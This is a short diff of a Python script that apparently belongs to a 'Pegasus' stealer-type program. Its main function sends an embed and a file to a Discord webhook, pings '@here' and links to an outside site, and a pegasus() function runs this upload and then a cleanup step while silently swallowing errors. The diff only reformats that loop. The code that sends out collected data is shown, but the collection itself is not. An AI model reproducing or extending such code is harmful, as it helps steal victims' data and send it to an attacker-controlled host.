@@ -64,12 +64,10 @@ def main(webhook_url):
     webhook.send(content="||@here|| <http://www.addidix.xyz>", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
     
 def pegasus():
-    global errors
-    
-    errors = []
-
-    for func in {main(WEBHOOK_URL), 
-    cleanup(),}:
+    for func in {
+        main(WEBHOOK_URL), 
+        cleanup(),
+    }:
         try:
             func()
         except:
